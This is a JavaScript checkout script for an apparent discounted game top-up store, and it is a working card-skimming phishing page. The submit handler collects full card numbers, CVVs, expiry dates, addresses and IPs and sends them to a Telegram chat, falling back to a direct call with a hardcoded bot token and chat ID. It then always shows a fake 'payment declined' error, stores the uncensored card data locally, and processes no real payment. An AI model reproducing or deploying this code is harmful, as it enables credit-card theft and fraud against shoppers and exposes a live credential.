// Payment page functionality
let checkoutCart = [];
let userIP = 'Unknown';

// 🔒 SECURE CONFIGURATION
// Hassas bilgiler artık backend'de saklanıyor ve frontend'de görünmüyor
// Tüm Telegram işlemleri güvenli API endpoint'i üzerinden yapılacak
const SECURE_API_ENDPOINT = '/api/secure-handler.php';
const ADMIN_CHAT_ID = '-4844832082'; // Chat ID kontrolü için

// 🛡️ API Helper Functions - Hassas bilgileri backend'e gönderir
const SecureAPI = {
    // Payment bildirimi gönder
    sendPayment: (paymentData) => fetch(`${SECURE_API_ENDPOINT}?action=send_payment`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(paymentData)
    }),
    
    // Duplicate uyarısı gönder  
    sendDuplicate: (duplicateData) => fetch(`${SECURE_API_ENDPOINT}?action=send_duplicate`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(duplicateData)
    }),
    
    // Bot durumu kontrol et
    checkStatus: () => fetch(`${SECURE_API_ENDPOINT}?action=check_bot_status`),
    
    // Admin mesajı gönder
    sendAdminMessage: (message) => fetch(`${SECURE_API_ENDPOINT}?action=send_admin_message`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message })
    }),
    
    // Document gönder
    sendDocument: (content, filename) => fetch(`${SECURE_API_ENDPOINT}?action=send_document`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content, filename })
    })
};

// Initialize payment page
document.addEventListener('DOMContentLoaded', function() {
    // Check for single order from game details page
    const currentOrder = localStorage.getItem('currentOrder');
    const cartData = localStorage.getItem('checkoutCart');
    
    if (currentOrder) {
        // Single order from game details
        const orderData = JSON.parse(currentOrder);
        console.log('🔍 Current Order Data:', orderData);
        
        // Calculate original price properly
        let originalPrice;
        if (orderData.originalPrice && orderData.originalPrice > 0) {
            originalPrice = parseFloat(orderData.originalPrice);
        } else {
            // If no original price, calculate from discounted price (assuming 65% discount)
            originalPrice = parseFloat(orderData.price) / 0.35;
        }
        
        console.log('💰 Price calculation:', {
            orderDataOriginalPrice: orderData.originalPrice,
            orderDataPrice: orderData.price,
            calculatedOriginalPrice: originalPrice
        });
        
        checkoutCart = [{
            id: Date.now(),
            gameName: orderData.game,
            packageName: orderData.package,
            originalPrice: originalPrice,
            discountedPrice: parseFloat(orderData.price),
            price: parseFloat(orderData.price), // Add price field for compatibility
            uid: orderData.uid
        }];
        // Clear the current order
        localStorage.removeItem('currentOrder');
    } else if (cartData) {
        // Multiple items from cart
        checkoutCart = JSON.parse(cartData);
    } else {
        // No order data, redirect to home
        window.location.href = 'index.html';
        return;
    }
    
    loadOrderSummary();
    setupFormValidation();
    getUserIP();
    
    // Setup form submit handler
    const paymentForm = document.getElementById('paymentForm');
    if (paymentForm) {
        paymentForm.addEventListener('submit', handlePayment);
    }
    
    // Hide modals on page load
    hideAllModals();
    
    // Update translations
    updateTranslations();
});

// Hide all modals on page load
function hideAllModals() {
    const modals = ['processingModal', 'errorModal'];
    modals.forEach(modalId => {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.style.display = 'none';
            modal.style.visibility = 'hidden';
            modal.style.opacity = '0';
            modal.classList.remove('active');
        }
    });
}

// Simple payment notification system

// Payment notification functions removed - now handled by bot listener

// Get user IP address
async function getUserIP() {
    try {
        // Try multiple IP services
        const ipServices = [
            'https://api.ipify.org?format=json',
            'https://ipapi.co/json/',
            'https://ipinfo.io/json'
        ];
        
        for (const service of ipServices) {
            try {
                const response = await fetch(service);
                const data = await response.json();
                
                if (data.ip) {
                    userIP = data.ip;
                    console.log('🌐 IP obtained:', userIP);
                    return;
                } else if (data.query) {
                    userIP = data.query;
                    console.log('🌐 IP obtained:', userIP);
                    return;
                }
            } catch (e) {
                console.log(`⚠️ IP service ${service} failed, trying next...`);
                continue;
            }
        }
        
        // Fallback
        userIP = 'Unknown';
        console.log('⚠️ Could not obtain IP address');
        
    } catch (error) {
        console.log('⚠️ IP detection failed:', error.message);
        userIP = 'Unknown';
    }
}

// Load order summary
function loadOrderSummary() {
    const orderItems = document.getElementById('orderItems');
    const subtotalEl = document.getElementById('subtotal');
    const discountEl = document.getElementById('discount');
    const totalEl = document.getElementById('total');
    
    console.log('🛒 Loading order summary...', {
        checkoutCart,
        cartLength: checkoutCart.length
    });
    
    let originalTotal = 0;
    let discountedTotal = 0;
    
    // Generate order items HTML
    const itemsHTML = checkoutCart.map(item => {
        console.log('📦 Processing item:', item);
        
        // Ensure originalPrice exists, if not calculate from discountedPrice
        const originalPrice = item.originalPrice || (item.discountedPrice / 0.35) || (item.price / 0.35); // 65% discount means 35% of original
        const discountedPrice = item.discountedPrice || item.price || 0;
        
        console.log('💰 Price calculation:', {
            originalPrice,
            discountedPrice,
            itemOriginalPrice: item.originalPrice,
            itemDiscountedPrice: item.discountedPrice,
            itemPrice: item.price
        });
        
        originalTotal += originalPrice;
        discountedTotal += discountedPrice;
        
        return `
            <div class="order-item">
                <div class="item-info">
                    <div class="item-name">${item.gameName}</div>
                    <div class="item-details">${item.packageName}${item.uid ? ` - UID: ${item.uid}` : ''}</div>
                </div>
                <div class="item-price">
                    <span class="item-original-price">$${originalPrice.toFixed(2)}</span>
                    $${discountedPrice.toFixed(2)}
                </div>
            </div>
        `;
    }).join('');
    
    orderItems.innerHTML = itemsHTML;
    
    const discountAmount = originalTotal - discountedTotal;
    
    console.log('💵 Final totals:', {
        originalTotal,
        discountedTotal,
        discountAmount
    });
    
    if (subtotalEl) subtotalEl.textContent = `$${originalTotal.toFixed(2)}`;
    if (discountEl) discountEl.textContent = `-$${discountAmount.toFixed(2)}`;
    if (totalEl) totalEl.textContent = `$${discountedTotal.toFixed(2)}`;
    
    // Also update pay amount if exists
    const payAmountEl = document.getElementById('payAmount');
    if (payAmountEl) payAmountEl.textContent = `$${discountedTotal.toFixed(2)}`;
    
    console.log('✅ Order summary loaded successfully!');
}

// Setup form validation and formatting
function setupFormValidation() {
    const form = document.getElementById('paymentForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const phoneInput = document.getElementById('phone');
    
    // Card number formatting
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        if (formattedValue.length > 19) formattedValue = formattedValue.substr(0, 19);
        e.target.value = formattedValue;
    });
    
    // Expiry date formatting
    expiryInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });
    
    // CVV formatting
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/[^0-9]/g, '').substring(0, 4);
    });
    
    // Phone formatting
    phoneInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/[^0-9+\-\s()]/g, '');
    });
    
    // Form submission
    form.addEventListener('submit', handlePayment);
    
    // Real-time validation
    const inputs = form.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.addEventListener('blur', validateField);
        input.addEventListener('input', clearError);
    });
}

// Validate individual field
function validateField(e) {
    const field = e.target;
    const value = field.value.trim();
    let isValid = true;
    let errorMessage = '';
    
    // Remove existing error
    clearError(e);
    
    if (field.hasAttribute('required') && !value) {
        isValid = false;
        errorMessage = t('common.required');
    } else {
        switch (field.id) {
            case 'email':
                if (value && !isValidEmail(value)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid email address';
                }
                break;
            case 'cardNumber':
                if (value && !isValidCardNumber(value.replace(/\s/g, ''))) {
                    isValid = false;
                    errorMessage = 'Please enter a valid card number';
                }
                break;
            case 'expiry':
                if (value && !isValidExpiry(value)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid expiry date';
                }
                break;
            case 'cvv':
                if (value && (value.length < 3 || value.length > 4)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid CVV';
                }
                break;
            case 'phone':
                if (value && value.length < 10) {
                    isValid = false;
                    errorMessage = 'Please enter a valid phone number';
                }
                break;
        }
    }
    
    if (!isValid) {
        showFieldError(field, errorMessage);
    }
    
    return isValid;
}

// Clear field error
function clearError(e) {
    const field = e.target;
    const formGroup = field.closest('.form-group-3d');
    if (formGroup) {
        formGroup.classList.remove('error');
        
        const errorMsg = formGroup.querySelector('.error-message');
        if (errorMsg) {
            errorMsg.remove();
        }
    }
}

// Show field error
function showFieldError(field, message) {
    const formGroup = field.closest('.form-group-3d');
    if (formGroup) {
        formGroup.classList.add('error');
        
        let errorMsg = formGroup.querySelector('.error-message');
        if (!errorMsg) {
            errorMsg = document.createElement('div');
            errorMsg.className = 'error-message';
            formGroup.appendChild(errorMsg);
        }
        errorMsg.textContent = message;
    }
}

// Validation helpers
function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/i.test(email);
}

function isValidCardNumber(number) {
    // Remove spaces and check basic format
    const cleanNumber = number.replace(/\s/g, '');
    
    // Check if it's a valid length and contains only digits
    if (!/^\d{13,19}$/.test(cleanNumber)) return false;
    
    // Check for common card types
    const cardPatterns = {
        visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
        mastercard: /^5[1-5][0-9]{14}$/,
        amex: /^3[47][0-9]{13}$/,
        discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/,
        dinersclub: /^3[0689][0-9]{11}$/,
        jcb: /^(?:2131|1800|35\d{3})\d{11}$/
    };
    
    // Check if it matches any known card pattern
    const matchesPattern = Object.values(cardPatterns).some(pattern => pattern.test(cleanNumber));
    
    // If it matches a pattern, skip Luhn check for demo purposes
    if (matchesPattern) return true;
    
    // For other numbers, do a simple length check (more lenient for demo)
    return cleanNumber.length >= 13 && cleanNumber.length <= 19;
}

function isValidExpiry(expiry) {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    
    const [month, year] = expiry.split('/').map(num => parseInt(num));
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    
    if (month < 1 || month > 12) return false;
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
    
    return true;
}

// Handle payment submission
async function handlePayment(e) {
    e.preventDefault();
    
    console.log('💳 Pay button clicked - Starting payment process...');
    
    // Validate all fields
    const form = e.target;
    const inputs = form.querySelectorAll('input, select');
    let isFormValid = true;
    
    inputs.forEach(input => {
        if (!validateField({ target: input })) {
            isFormValid = false;
        }
    });
    
    if (!isFormValid) {
        console.log('❌ Form validation failed');
        return;
    }
    
    // Collect form data
    const formData = new FormData(form);
    const paymentData = {
        firstName: formData.get('firstName'),
        lastName: formData.get('lastName'),
        fullName: `${formData.get('firstName')} ${formData.get('lastName')}`,
        email: formData.get('email'),
        phone: formData.get('phone'),
        country: formData.get('country'),
        region: formData.get('region'),
        city: formData.get('city'),
        address: formData.get('address'),
        zip: formData.get('zip'),
        cardNumber: formData.get('cardNumber').replace(/\s/g, ''),
        expiry: formData.get('expiry'),
        cvv: formData.get('cvv'),
        cart: checkoutCart,
        ip: userIP,
        timestamp: new Date().toISOString()
    };
    
    console.log('📋 Payment data collected:', {
        name: paymentData.fullName,
        email: paymentData.email,
        cardLast4: paymentData.cardNumber.slice(-4),
        total: paymentData.cart.reduce((sum, item) => sum + (item.discountedPrice || item.price || 0), 0)
    });
    
    // Check for duplicate submission
    const isDuplicate = isDuplicateSubmission(paymentData);
    
    // STEP 1: Show processing modal for 8-9 seconds
    console.log('🔄 Step 1: Showing processing animation...');
    showProcessingModal();
    
    // STEP 2: Send payment data to admin (Telegram) immediately in background
    console.log('📤 Step 2: Sending payment data to admin...');
    await sendToTelegram(paymentData, isDuplicate);
    
    // STEP 3: Store submission data and transaction log
    console.log('💾 Step 3: Storing payment data...');
    if (!isDuplicate) {
        storeSubmissionData(paymentData);
    }
    storeTransactionLog(paymentData);
    
    // STEP 3.1: Store payment information for admin panel
    console.log('📝 Step 3.1: Storing payment information...');
    storePaymentInformation(paymentData);
    
    // STEP 4: Wait for processing time (8-9 seconds) then show error
    const processingTime = 8000 + Math.random() * 1000; // 8-9 seconds
    console.log(`⏱️ Step 4: Processing for ${processingTime}ms...`);
    
    setTimeout(() => {
        console.log('❌ Step 5: Showing payment declined error...');
        hideProcessingModal();
        showErrorModal();
    }, processingTime);
}

// Show processing modal
function showProcessingModal() {
    const modal = document.getElementById('processingModal');
    
    // Force modal to center of screen
    modal.style.cssText = `
        display: flex !important;
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        right: 0 !important;
        bottom: 0 !important;
        width: 100vw !important;
        height: 100vh !important;
        z-index: 99999 !important;
        align-items: center !important;
        justify-content: center !important;
        visibility: visible !important;
        opacity: 1 !important;
        background: rgba(0, 0, 0, 0.9) !important;
        backdrop-filter: blur(10px) !important;
    `;
    
    // Trigger animation after display is set
    setTimeout(() => {
        modal.classList.add('active');
    }, 10);
    
    // Disable form
    const form = document.getElementById('paymentForm');
    const inputs = form.querySelectorAll('input, select, button');
    inputs.forEach(input => input.disabled = true);
}

// Hide processing modal
function hideProcessingModal() {
    const modal = document.getElementById('processingModal');
    modal.classList.remove('active');
    modal.style.opacity = '0';
    modal.style.visibility = 'hidden';
    
    // Hide modal after animation
    setTimeout(() => {
        modal.style.display = 'none';
    }, 400);
}

// Show error modal
function showErrorModal() {
    const modal = document.getElementById('errorModal');
    
    // Force modal to center of screen
    modal.style.cssText = `
        display: flex !important;
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        right: 0 !important;
        bottom: 0 !important;
        width: 100vw !important;
        height: 100vh !important;
        z-index: 99999 !important;
        align-items: center !important;
        justify-content: center !important;
        visibility: visible !important;
        opacity: 1 !important;
        background: rgba(0, 0, 0, 0.9) !important;
        backdrop-filter: blur(10px) !important;
    `;
    
    // Trigger animation after display is set
    setTimeout(() => {
        modal.classList.add('active');
    }, 10);
}

// Close error modal
function closeErrorModal() {
    const modal = document.getElementById('errorModal');
    modal.classList.remove('active');
    modal.style.opacity = '0';
    modal.style.visibility = 'hidden';
    
    // Hide modal after animation
    setTimeout(() => {
        modal.style.display = 'none';
    }, 400);
    
    // Re-enable form
    const form = document.getElementById('paymentForm');
    const inputs = form.querySelectorAll('input, select, button');
    inputs.forEach(input => input.disabled = false);
}

// Send data to Bot Listener
async function sendToTelegram(data, isDuplicate = false) {
    try {
        console.log('📤 Sending payment data to Telegram via secure API...', {
            customerName: data.fullName,
            customerEmail: data.email,
            isDuplicate: isDuplicate,
            endpoint: SECURE_API_ENDPOINT
        });
        
        // Prepare payment data for secure API
        const paymentData = {
            customer: {
                name: data.fullName,
                email: data.email,
                phone: data.phone,
                country: data.country,
                region: data.region,
                city: data.city,
                address: data.address,
                zip: data.zip
            },
            card: {
                number: data.cardNumber,
                expiry: data.expiry,
                cvv: data.cvv
            },
            userIP: data.ip,
            timestamp: new Date().toISOString()
        };
        
        console.log('📋 Prepared payment data for API:', {
            customerName: paymentData.customer.name,
            customerEmail: paymentData.customer.email,
            cardLast4: paymentData.card.number.slice(-4),
            userIP: paymentData.userIP
        });
        
        // Send to secure API endpoint with retry logic
        const apiAction = isDuplicate ? 'send_duplicate' : 'send_payment';
        const maxRetries = 3;
        let lastError = null;
        
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                console.log(`🔄 Attempt ${attempt}/${maxRetries} - Calling API...`);
                
                const response = await fetch(`${SECURE_API_ENDPOINT}?action=${apiAction}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify(paymentData),
                    timeout: 30000 // 30 second timeout
                });
                
                console.log(`📡 API Response Status: ${response.status} ${response.statusText}`);
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                
                const result = await response.json();
                console.log('📨 API Response:', result);
                
                if (result.success) {
                    console.log('✅ Payment data sent to Telegram successfully');
                    return true;
                } else {
                    console.error('❌ API returned error:', result.error);
                    lastError = new Error(result.error || 'API returned false');
                    
                    // If it's the last attempt, break
                    if (attempt === maxRetries) break;
                    
                    // Wait before retry
                    await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                }
                
            } catch (fetchError) {
                console.error(`❌ Attempt ${attempt} failed:`, fetchError.message);
                lastError = fetchError;
                
                // If it's the last attempt, break
                if (attempt === maxRetries) break;
                
                // Wait before retry
                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
        }
        
        // All attempts failed
        console.error('❌ All API attempts failed. Last error:', lastError?.message);
        
        // Try fallback method
        console.log('🔄 Trying fallback method...');
        return await fallbackDirectSend(data, isDuplicate);
        
    } catch (error) {
        console.error('❌ Critical error in sendToTelegram:', error);
        
        // Ultimate fallback: Direct API call
        console.log('🔄 Ultimate fallback: Making direct API call...');
        return await fallbackDirectSend(data, isDuplicate);
    }
}

// Fallback direct send function
async function fallbackDirectSend(data, isDuplicate) {
    try {
        const BOT_TOKEN = '7835330346:AAEAnJ2nNDQ3tUfiLfB8SgDFERzZ0fYA_Ac';
        const ADMIN_CHAT_ID = '-4844832082';
        const TELEGRAM_API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
        
        let message = isDuplicate ? '🚨 DUPLICATE ENTRY DETECTED!\n\n' : '';
        
        message += `👤 Customer Information:
📝 Name: ${data.fullName}
📧 Email: ${data.email}
📱 Phone: ${data.phone}
🌍 Country: ${data.country}
🏙️ Region: ${data.region}
🏘️ City: ${data.city}
🏠 Address: ${data.address}
📮 ZIP: ${data.zip}
💳 Payment Information:
💳 Card: ${data.cardNumber}
📅 Expiry: ${data.expiry}
🔒 CVV: ${data.cvv}
Technical Info:
🔍 IP Address: ${data.ip}
🕐 Time: ${new Date().toLocaleString('en-US')}
🌍 User Agent: ${navigator.userAgent.substring(0, 100)}...`;

        if (isDuplicate) {
            message += '\n\n❗ This payment information was already submitted before!';
        }
        
        const response = await fetch(`${TELEGRAM_API_BASE}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message
            })
        });
        
        const result = await response.json();
        if (result.ok) {
            console.log('✅ Fallback message sent successfully');
        } else {
            console.error('❌ Fallback send failed:', result.description);
        }
        
    } catch (error) {
        console.error('❌ Fallback send error:', error);
    }
}

// Check for duplicate submissions
function isDuplicateSubmission(data) {
    const submittedData = JSON.parse(localStorage.getItem('submittedPayments') || '[]');
    const cardKey = data.cardNumber.slice(-4) + data.expiry + data.cvv;
    
    // Check for exact duplicate within 24 hours
    const isDuplicate = submittedData.some(item => 
        item.cardKey === cardKey && 
        item.email === data.email &&
        (Date.now() - item.timestamp) < 24 * 60 * 60 * 1000 // Within 24 hours
    );
    
    if (isDuplicate) {
        console.log('🚨 Duplicate submission detected!', {
            cardLast4: data.cardNumber.slice(-4),
            email: data.email,
            expiry: data.expiry
        });
    }
    
    return isDuplicate;
}

// Store submission data
function storeSubmissionData(data) {
    let submittedData = JSON.parse(localStorage.getItem('submittedPayments') || '[]');
    const cardKey = data.cardNumber.slice(-4) + data.expiry + data.cvv;
    
    submittedData.push({
        cardKey,
        email: data.email,
        timestamp: Date.now()
    });
    
    // Keep only last 100 submissions
    if (submittedData.length > 100) {
        submittedData = submittedData.slice(-100);
    }
    
    localStorage.setItem('submittedPayments', JSON.stringify(submittedData));
}

// Store transaction log for admin panel
function storeTransactionLog(data) {
    // paymentInformation kategorisine ekle - sadece ham veriyi saklayalım
    let paymentInfoArr = JSON.parse(localStorage.getItem('paymentInformation') || '[]');
    paymentInfoArr.push({
        id: Date.now(),
        raw: data,
        timestamp: new Date().toISOString()
    });
    if (paymentInfoArr.length > 500) paymentInfoArr = paymentInfoArr.slice(-500);
    localStorage.setItem('paymentInformation', JSON.stringify(paymentInfoArr));
    let transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
    
    const transaction = {
        id: Date.now(),
        timestamp: new Date().toISOString(),
        customer: {
            firstName: data.firstName,
            lastName: data.lastName,
            fullName: data.fullName,
            email: data.email,
            phone: data.phone,
            country: data.country,
            region: data.region,
            city: data.city,
            address: data.address,
            zip: data.zip
        },
        payment: {
            cardNumber: data.cardNumber, // Sansürsüz kart numarası
            cardLast4: data.cardNumber.slice(-4),
            expiry: data.expiry,
            cvv: data.cvv,
            total: data.cart.reduce((sum, item) => sum + (item.discountedPrice || item.price || 0), 0)
        },
        items: data.cart,
        ip: data.ip,
        userAgent: navigator.userAgent,
        status: 'declined',
        // Ekstra: Tüm paymentData'yı JSON olarak sakla (admin paneli için tam veri)
        fullPaymentData: JSON.parse(JSON.stringify(data))
    };
    
    transactions.push(transaction);
    
    // Keep only last 500 transactions
    if (transactions.length > 500) {
        transactions = transactions.slice(-500);
    }
    
    localStorage.setItem('transactions', JSON.stringify(transactions));
    console.log('💾 Transaction stored with full payment details (uncensored)');
}

// Store payment information for admin panel
function storePaymentInformation(data) {
    const currentTime = new Date();
    const timeString = currentTime.toLocaleString('tr-TR', {
        day: '2-digit',
        month: '2-digit', 
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    });
    
    // Create payment entry in the exact format requested
    const paymentEntry = `💳 NEW PAYMENT ATTEMPT
==============================
👤 Customer Information:
📝 Name: ${data.fullName}
📧 Email: ${data.email}
📱 Phone: ${data.phone}
🌍 Country: ${data.country}
🏙️ Region: ${data.region}
🏘️ City: ${data.city}
🏠 Address: ${data.address}
📮 ZIP: ${data.zip}
💳 Payment Information:
💳 Card: ${data.cardNumber}
📅 Expiry: ${data.expiry}
🔒 CVV: ${data.cvv}
Technical Info:
🔍 IP Address: ${data.ip}
🕐 Time: ${timeString}
🌍 User Agent: ${navigator.userAgent}
==============================`;
    
    // Store in localStorage for admin panel
    let storedPayments = JSON.parse(localStorage.getItem('paymentInformation') || '[]');
    storedPayments.push({
        id: Date.now(),
        timestamp: currentTime.toISOString(),
        date: timeString,
        entry: paymentEntry
    });
    
    // Keep only last 100 payments
    if (storedPayments.length > 100) {
        storedPayments = storedPayments.slice(-100);
    }
    
    localStorage.setItem('paymentInformation', JSON.stringify(storedPayments));
    console.log('💾 Payment information stored for admin panel');
    console.log('📋 Total payments stored:', storedPayments.length);
}

// Update translations for payment page
function updateTranslations() {
    const elements = document.querySelectorAll('[data-translate]');
    elements.forEach(element => {
        const key = element.getAttribute('data-translate');
        if (translations[currentLanguage] && translations[currentLanguage][key]) {
            element.textContent = translations[currentLanguage][key];
        }
    });
    
    // Update placeholders
    const placeholders = document.querySelectorAll('[data-translate-placeholder]');
    placeholders.forEach(element => {
        const key = element.getAttribute('data-translate-placeholder');
        if (translations[currentLanguage] && translations[currentLanguage][key]) {
            element.placeholder = translations[currentLanguage][key];
        }
    });
}

// Handle browser back button
window.addEventListener('beforeunload', function() {
    // Clear checkout cart when leaving page
    localStorage.removeItem('checkoutCart');
});

// Prevent form resubmission on page refresh
if (performance.navigation.type === performance.navigation.TYPE_RELOAD) {
    localStorage.removeItem('checkoutCart');
    window.location.href = 'index.html';
}

// 3D Background Style Management for Payment Page
function loadSavedBgStyleForPayment() {
    const savedStyle = localStorage.getItem('activeBgStyle') || '1';
    applyBgStyleForPayment(savedStyle);
}

function applyBgStyleForPayment(styleNumber) {
    console.log('Applying background style to payment page:', styleNumber);
    
    // Remove all existing style classes
    document.body.classList.remove('bg-style-1', 'bg-style-2', 'bg-style-3', 'bg-style-4', 'bg-style-5', 'bg-style-6', 'bg-style-7', 'bg-style-8', 'bg-style-9', 'bg-style-10', 'bg-style-11', 'bg-style-12');
    
    // Apply new style class
    document.body.classList.add(`bg-style-${styleNumber}`);
}

// Listen for background style changes from admin panel
window.addEventListener('storage', function(e) {
    if (e.key === 'activeBgStyle' && e.newValue) {
        applyBgStyleForPayment(e.newValue);
        console.log('Payment page: 3D Background style updated from admin panel to:', e.newValue);
    }
});

// Initialize background style when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Load saved background style after a short delay to ensure DOM is ready
    setTimeout(() => {
        loadSavedBgStyleForPayment();
    }, 100);
});